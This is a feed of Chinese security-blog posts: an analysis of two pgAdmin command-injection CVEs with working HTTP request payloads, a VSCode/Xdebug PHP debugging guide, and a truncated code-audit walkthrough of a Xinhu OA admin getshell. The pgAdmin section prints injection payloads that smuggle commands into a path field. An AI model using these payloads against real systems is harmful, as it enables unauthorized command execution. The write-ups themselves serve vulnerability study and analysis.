<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
</blockquote>
<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
<p>在本地搭建环境，访问5050端口是登录界面</p>
<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>

<p>成功命令执行，返回包如下</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
<ul>
<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
</ul>
<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
<ul>
<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
</ul>
<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
<p>Windows下返回结果为True</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
<p>而Linux下返回结果为False</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>

<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
<p>成功命令执行</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>vscode+xdebug调试php代码</title>
    <url>/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81.html</url>
    <content><![CDATA[<p>记录如何利用vscode+xdebug调试php代码</p>
<span id="more"></span>



<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>本篇文章利用的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vscode+phpstudy+xdebug</span><br></pre></td></tr></table></figure>

<h1 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h1><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="配置phpstudy"><a href="#配置phpstudy" class="headerlink" title="配置phpstudy"></a>配置phpstudy</h3><p>首先要打开xdebug拓展</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707224245819.png"></p>
<p>打开软件管理，找到对应的php版本点击设置</p>
<p>打开xdebug，设置监听端口为9003（9000端口会和nginx冲突）</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707224406611.png"></p>
<p>然后访问<code>phpstudy_pro\Extensions\php\php7.3.4nts</code>，打开配置文件php.ini</p>
<p>拉到最下面，观察配置是否正确</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9003</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.remote_autostart = on</span><br></pre></td></tr></table></figure>

<p>注：这里最重要的就是<code>xdebug.remote_autostart = on</code>和<code>xdebug.remote_enable=On</code></p>
<h3 id="配置vscode"><a href="#配置vscode" class="headerlink" title="配置vscode"></a>配置vscode</h3><p>要能进行调试，必须要有下面的拓展</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707224935530.png"></p>
<p>下载好后，我们点击vscode右下角的设置，然后搜索php</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707225125914.png"></p>
<p>编辑settings.json</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;php.debug.executablePath&quot;: &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php.exe&quot;,</span><br><span class="line">    &quot;php.validate.executablePath&quot;: &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php.exe&quot;,</span><br><span class="line">    &quot;phpserver.phpConfigPath&quot;: &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php.ini&quot;,</span><br><span class="line">    &quot;phpserver.phpPath&quot;: &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php.exe&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="配置launch-json"><a href="#配置launch-json" class="headerlink" title="配置launch.json"></a>配置launch.json</h3><p>点击左侧的调试图标，点击创建launch.json</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707225355732.png"></p>
<p>当然选择的调试器是PHP</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707225451701.png"></p>
<p>这里是需要选择文件夹才能创建，我选的是<code>phpstudy_pro\WWW</code></p>
<p>创建好后要查看此文件的端口是否和我们phpstudy上监听的端口号一致（即php配置文件xdebug的端口号）</p>
<p>然后将<code>Launch currently open script</code>的端口号0改成9003</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707225729043.png"></p>
<p>配置好后就可以进行调试</p>
<h4 id="进行调试"><a href="#进行调试" class="headerlink" title="进行调试"></a>进行调试</h4><p>我们在WWW下的index.php编写一个demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>打上断点</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707225948070.png"></p>
<p>F5或者直接点击调试</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707230037577.png"></p>
<p>然后我们访问<code>localhost/index.php</code>，可以看到我们的代码成功动起来</p>
<p>一步步调试，可以在左侧看调试过程</p>
<p><img src="/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81/image-20240707230121869.png"></p>
<h2 id="PHP8"><a href="#PHP8" class="headerlink" title="PHP8"></a>PHP8</h2><blockquote>
<p>PHP8和7的xdebug配置文件名略有不同</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php8.0.2nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php8.0.2nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php8.0.2nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.client_host=localhost</span><br><span class="line">xdebug.client_port=9005</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.remote_autostart =On</span><br><span class="line">xdebug.mode=debug</span><br><span class="line">xdebug.start_with_request = yes</span><br></pre></td></tr></table></figure>





<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>掌握调试是学习代码审计非常重要的一部分，网上有关如何利用vscode结合xdebug进行调试的文章也挺多的，不过还是值得记录一下，本人在重装phpstudy和vscode后重新配置调试环境，并且最终实现php代码的调试。当然也是给某人专门写的配置调试环境教程，希望能等到这一天。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>信呼OA后台getshell分析</title>
    <url>/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[<p>在先知社区看到的一篇关于信呼OA后台getshell的文章，感觉还不错就拿来记录一下</p>
<span id="more"></span>

<h1 id="信呼OA后台getshell分析"><a href="#信呼OA后台getshell分析" class="headerlink" title="信呼OA后台getshell分析"></a>信呼OA后台getshell分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>phpstudy+信呼OA版本2.6.3</p>
</blockquote>
<p>源码链接：<a href="https://github.com/rainrocka/xinhu">https://github.com/rainrocka/xinhu</a></p>
<p>使用phpstudy创建网站，以及对应数据库</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113232005.png"></p>
<p>然后将源码文件导入对应文件夹下</p>
<p>访问网站进行安装</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113443429.png"></p>
<p>安装完后告诉我们后台账号和密码<code>admin:123456</code>，出现改密码提示更新一下密码就行</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724113700362.png"></p>
<hr>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
<p>了解路由结构</p>
</blockquote>
<p>我们先从源码index.php看起，第八行包含config.php配置文件</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725140908145.png"></p>
<p>跟进一下，发现也包含了三个php文件</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725141057327.png"></p>
<p>我们跟进查看，发现rockFun.php文件只是定义了一系列方法，Chajian.php文件则是定义了Chajian类，rockClass.php文件定义了rockClass类。接着如果未被定义，那么默认项目和入口分别为<code>webmain</code>和<code>index</code>，后面就是其他一些定义内容。</p>
<p>回到index.php，<code>$_uurl</code>由<code>$rock-&gt;get(&#39;rewriteurl&#39;);</code>决定</p>
<p>跟进一下（注意这里是<code>rewrite()</code>方法）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewrite</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$a</span>,<span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(REWRITE==<span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$a</span> == <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$s</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">elseif</span>(<span class="variable">$a</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;_&#x27;</span>.<span class="variable">$s</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$url</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;_&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;_&#x27;</span>.<span class="variable">$s</span>.<span class="string">&#x27;_a.html&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$url</span>	= <span class="string">&#x27;index.php?m=&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">&#x27;&#x27;</span>)<span class="variable">$url</span>.=<span class="string">&#x27;&amp;a=&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$s</span> != <span class="string">&#x27;&#x27;</span>)<span class="variable">$url</span>.=<span class="string">&#x27;&amp;s=&#x27;</span>.<span class="variable">$s</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$url</span>;	</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<p>相当于是从外部接收<code>$m,$a,$s</code>参数进行重写，返回值url</p>
<p>由于这里默认没有接收参数，所以<code>$_uurl</code>为空，那么执行else语句跟进jm类的<code>gettoken()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gettoken</span>(<span class="params"><span class="variable">$na</span>, <span class="variable">$dev</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$s</span> = <span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;rocktokenarr[<span class="variable">$na</span>]))&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;rocktokenarr[<span class="variable">$na</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$na</span>, <span class="variable">$dev</span>);</span><br><span class="line">	&#125;			</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进rock类的<code>get()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$dev</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$val</span>=<span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$name</span>]))<span class="variable">$val</span>=<span class="variable">$_GET</span>[<span class="variable">$name</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$val</span>))<span class="variable">$val</span>=<span class="variable">$dev</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">jmuncode</span>(<span class="variable">$val</span>, <span class="variable">$lx</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于接收GET请求参数<code>m,d,a</code></p>
<p>不仅如此，回到index.php我们继续往下看发现还有请求参数<code>ajaxbool</code></p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725143224762.png"></p>
<p>我们看向最后一行代码，跟进一下View.php</p>
<p>如果参数m包含<code>|</code>，那么以<code>|</code>分割开赋值给<code>$m</code>和<code>$_m</code></p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725144721241.png"></p>
<p>然后调用<code>strformat()</code>方法替换其中的占位符，最后分别赋值给<code>$actfile</code>和<code>$actfile1</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">strformat</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$len</span> = <span class="title function_ invoke__">func_num_args</span>();</span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++)<span class="variable">$arr</span>[] = <span class="title function_ invoke__">func_get_arg</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="variable">$s</span>	 = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stringformat</span>(<span class="variable">$str</span>, <span class="variable">$arr</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们继续往下看</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725144910173.png"></p>
<p>将<code>$m</code>与<code>ClassAction</code>拼接后实例化，继续将<code>$a</code>与<code>Action</code>拼接，然后检测方法是否存在，如果存在则调用该方法</p>
<p>具体来讲和我们路由中的传参参数有关，也就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">对<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]ClassAction类进行实例化</span><br><span class="line">如果方法存在，则调用<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]Action方法</span><br></pre></td></tr></table></figure>

<p>再往下则是该CMS自写的模板解析功能</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725145536418.png"></p>
<p>以上就是框架大概的运行原理，下面我们定义一个自己的控制器</p>
<p>定义目录&#x2F;文件结构如下</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725150003510.png"></p>
<p>rev1veAction.php内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rev1veClassAction</span> <span class="keyword">extends</span> <span class="title">ActionNot</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testerAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello Word&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：这里有个坑点，参考文章的示例没有Class直接就是<code>rev1veAction</code>这样。一开始按照文章来结果复现不出来，后面调试一下才注意到这里的类名应该是拼接上<code>ClassAction</code>，原理前面也分析过就不赘述了</p>
</blockquote>
<p>tpl_rev1ve_tester.html内容如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>test模板<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们先登录管理员账号，然后执行以下命令即可实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?d=test&amp;m=rev1ve&amp;a=tester</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240725152525513.png"></p>
<hr>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>漏洞触发点</strong></p>
<p>位于<code>webmain\main\flow\flowAction.php</code>的<code>inputAction()</code>方法</p>
<p>我们跟进一下，往下翻代码注意到存在写入php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">		$apaths		= &#x27;&#x27;.P.&#x27;/flow/input/mode_&#x27;.$modenum.&#x27;Action.php&#x27;;</span><br><span class="line">		$apath		= &#x27;&#x27;.ROOT_PATH.&#x27;/&#x27;.$apaths.&#x27;&#x27;;</span><br><span class="line">		if(!file_exists($apath))&#123;</span><br><span class="line">			$stra = &#x27;&lt;?php</span><br><span class="line">/**</span><br><span class="line">*	此文件是流程模块【&#x27;.$modenum.&#x27;.&#x27;.$rs[&#x27;name&#x27;].&#x27;】对应控制器接口文件。</span><br><span class="line">*/ </span><br><span class="line">			//省略部分无关代码</span><br><span class="line">			&#x27;;</span><br><span class="line">			$this-&gt;rock-&gt;createtxt($apaths, $stra);</span><br></pre></td></tr></table></figure>

<p>这里的参数<code>$modenum</code>和<code>$rs[&#39;name&#39;]</code>被拼接到写入文件的注释里，我们可以尝试注释掉前后代码实现RCE</p>
<p>看看两个参数是怎么来的，往上翻</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724172517962.png"></p>
<p>这里<code>$rs</code>是调用<code>m()</code>跟进一下，并传参为<code>flow__get</code>的表名</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724172923255.png"></p>
<p>第34行代码出现实例化Model类，那么就继续调用该类的<code>getone()</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getone($where, $fields=&#x27;*&#x27;, $order=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;db-&gt;getone($this-&gt;table, $where, $fields, $order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反正是从数据库中获取的，并且没有对其进行过滤</p>
<p><strong>利用思路</strong></p>
<ol>
<li><code>insert data -&gt;  flow_set</code>数据表</li>
<li>执行inputAction 方法</li>
<li>代码执行</li>
</ol>
<p>能insert数据的地方有好几个，最初是选用同一文件位于88行<code>flowsetsavebefore()</code>方法</p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724173808725.png"></p>
<p>不过这里可以看到过滤非常严格，而我们写的马需要注释符<code>/**/</code>以及<code>()</code>，所以这条路是走不通的。</p>
<p>继续翻代码，找到也有执行SQL语句的<code>webmain\system\beifen\beifenAction.php</code>的<code>huifdatanewAjax()</code></p>
<p><img src="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/image-20240724175433613.png"></p>
<p>首先我们是管理员账号，所以不用去管参数<code>$adminid</code>是否为1。接着POST接收参数<code>folder</code>和<code>sid</code>，获取数据库所有表名，继续检查给定路径下的文件是否存在，如果存在则执行<code>m(&#39;beifen&#39;)-&gt;getbfdata()</code>方法，跟进一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getbfdata</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$path</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$str</span> 	= <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$path</span>==<span class="string">&#x27;&#x27;</span>)<span class="variable">$path</span>	= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.UPDIR.<span class="string">&#x27;/data/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span 